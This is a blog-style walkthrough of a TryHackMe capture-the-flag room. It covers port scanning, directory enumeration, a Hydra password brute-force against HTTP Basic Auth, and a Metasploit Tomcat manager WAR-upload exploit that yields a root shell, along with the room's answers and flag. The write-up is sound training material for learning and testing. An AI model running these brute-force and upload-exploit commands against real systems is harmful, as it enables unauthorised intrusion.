# TryHackMe ToolsRUs Room - Complete Walkthrough

*A comprehensive guide to solving the ToolsRUs CTF challenge*

---

## Introduction

The ToolsRUs room on TryHackMe is an excellent beginner-friendly challenge that introduces fundamental penetration testing concepts including web enumeration, brute force attacks, and Tomcat exploitation. This walkthrough will guide you through each step of the process, explaining the methodology and tools used.

**Room Difficulty**: Easy  
**Skills Required**: Basic Linux, Web enumeration, Metasploit  
**Tools Used**: Nmap, Dirbuster, Hydra, Nikto, Metasploit

---

## Initial Enumeration

As with any penetration test, we start with reconnaissance to identify open ports and running services.

### Nmap Port Scan

```bash
nmap -sCV $IP-ADDRESS
```

**Results:**
- **Port 22**: SSH (OpenSSH 7.2p2)
- **Port 80**: Apache HTTP Server 2.4.18
- **Port 1234**: Apache Tomcat/Coyote JSP engine 1.1
- **Port 8009**: Apache Jserv (AJP v1.3)

The most interesting findings are the web servers on ports 80 and 1234, with port 1234 running Tomcat.

---

## Web Enumeration (Port 80)

### Directory Brute Force

Using Dirbuster to discover hidden directories and files:

```bash
dirbuster -u http://$IP-ADDRESS -l /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e php,html,txt,js
```

**Key Discoveries:**
- `/guidelines` - Contains useful information
- `/protected` - Protected directory requiring authentication

### Questions Answered:
1. **What directory can you find, that begins with a "g"?** → `guidelines`
2. **Whose name can you find from this directory?** → `bob`
3. **What directory has basic authentication?** → `protected`

---

## Brute Force Attack

The `/protected` directory uses HTTP Basic Authentication. Since we discovered the username "bob" from the guidelines directory, we can attempt a brute force attack.

### Using Hydra

```bash
hydra -f -vV -l bob -P /usr/share/wordlists/rockyou.txt $IP-ADDRESS http-get /protected
```

**Key Parameters:**
- `-f`: Stop after finding first valid pair
- `-vV`: Verbose output
- `-l bob`: Single username
- `-P rockyou.txt`: Password wordlist
- `http-get`: HTTP GET authentication method
- `/protected`: Target path

**Result:** `bob:bubbles`

4. **What is bob's password to the protected part of the website?** → `bubbles`

---

## Tomcat Service Analysis

### Basic Information

From our initial nmap scan:
5. **What other port that serves a web service is open on the machine?** → `1234`
6. **Going to the service running on that port, what is the name and version of the software?** → `Apache Tomcat/7.0.88`

### Nikto Vulnerability Scan

```bash
nikto -host http://$IP-ADDRESS:1234/manager/html
```

**Critical Findings:**
- **Dangerous HTTP Methods**: PUT and DELETE enabled
- **Tomcat Manager Interface**: Multiple manager endpoints discovered
- **Documentation Files**: 5 documentation files found
- **File Upload Capability**: PUT method allows file uploads

### Questions Answered:
7. **How many documentation files did Nikto identify?** → `5`

### Apache Server Version

```bash
nikto -h http://$IP-ADDRESS -p 80
```

8. **What is the server version (run the scan against port 80)?** → `Apache/2.4.18`
9. **What version of Apache-Coyote is this service using?** → `1.1`

---

## Exploitation Phase

### Identifying the Attack Vector

Based on our reconnaissance:
- ✅ Valid Tomcat Manager credentials (`bob:bubbles`)
- ✅ Manager interface accessible
- ✅ PUT method enabled (file upload capability)
- ✅ Default Tomcat installation

This is a perfect scenario for the **Tomcat Manager Upload** exploit.

### Metasploit Exploitation

```bash
msfconsole

# Search for relevant exploits
search tomcat

# Select the manager upload exploit
use exploit/multi/http/tomcat_mgr_upload

# Configure the exploit
set USERNAME bob
set PASSWORD bubbles
set RHOST $IP-ADDRESS
set RPORT 1234
set TARGETURI /manager

# Launch the exploit
exploit
```

**Why This Exploit Works:**
1. **Authentication**: Uses our valid credentials
2. **Manager Access**: Leverages Tomcat Manager functionality
3. **WAR Upload**: Creates and uploads malicious WAR file
4. **Code Execution**: Deploys and executes payload automatically

### Success!

The exploit successfully provides a Meterpreter shell with root privileges.

```bash
meterpreter > getuid
Server username: root

meterpreter > cd /root
meterpreter > cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

10. **What user did you get a shell as?** → `root`
11. **What text is in the file /root/flag.txt?** → `ff1fc4a81affcc7688cf89ae7dc6e0e1`

---

## Key Learning Points

### 1. **Enumeration is Critical**
Thorough reconnaissance revealed multiple attack vectors and provided essential information for exploitation.

### 2. **Default Credentials are Dangerous**
The same credentials found in `/guidelines` worked for the Tomcat Manager, highlighting the risk of credential reuse.

### 3. **Service-Specific Vulnerabilities**
Understanding how Tomcat Manager works (WAR file deployment) was crucial for selecting the right exploit.

### 4. **Tool Selection Matters**
- **Hydra**: Perfect for HTTP Basic Auth brute force
- **Nikto**: Excellent for web vulnerability scanning
- **Metasploit**: Reliable exploit framework for known vulnerabilities

---

## Methodology Summary

1. **Reconnaissance**: Port scanning and service identification
2. **Enumeration**: Directory brute force and content discovery
3. **Credential Attack**: Brute force authentication mechanisms
4. **Vulnerability Assessment**: Identify exploitable services
5. **Exploitation**: Use appropriate tools and techniques
6. **Post-Exploitation**: Verify access and retrieve objectives

---

## Conclusion

The ToolsRUs room effectively demonstrates a realistic attack chain from initial reconnaissance to full system compromise. The combination of weak credentials, default configurations, and dangerous service permissions created multiple vulnerabilities that could be chained together for successful exploitation.

**Key Takeaways for Defenders:**
- Change default credentials immediately
- Disable unnecessary HTTP methods (PUT, DELETE)
- Implement proper access controls for management interfaces
- Regular security scanning and vulnerability assessments

This room serves as an excellent introduction to web application penetration testing and demonstrates why proper security hardening is essential for web services.

---

*Happy hacking! 🔒*

**Connect with me:**
- LinkedIn: https://www.linkedin.com/in/ronit-singh-389064230
- X (Twitter): https://x.com/071Ronit
- GitHub: https://github.com/r0nxtsingh/r0nxtsingh
